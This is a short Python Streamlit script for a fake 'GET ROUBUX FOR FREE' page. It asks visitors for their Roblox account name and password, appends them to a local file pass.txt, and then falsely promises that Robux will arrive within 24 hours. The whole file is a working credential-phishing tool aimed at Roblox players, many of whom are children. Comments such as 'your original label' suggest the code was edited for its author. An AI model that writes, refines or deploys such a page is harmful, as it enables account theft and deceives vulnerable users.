import streamlit as st
import os

# Header
st.header("GET ROUBUX FOR FREE 🤑")

# Dropdown
option = st.selectbox(
    "how many robux you wan't",  # your original label
    ['5000', '8000', '10000', '16000']
)

# Inputs
uid = st.text_input("your roblox account:")  # your original label
password = st.text_input("Enter Password for verification:", type="password")  # hide password input

# Submit Button
if st.button("sumbit"):  # your original button text
    try:
        with open("pass.txt", "a") as file:
            file.write(f"UID: {uid}, Password: {password}, Robux: {option}\n")
        st.text("robux will be added in your account in 24 hours")  # your original confirmation message
    except Exception as e:
        st.error(f"Error saving credentials: {e}")
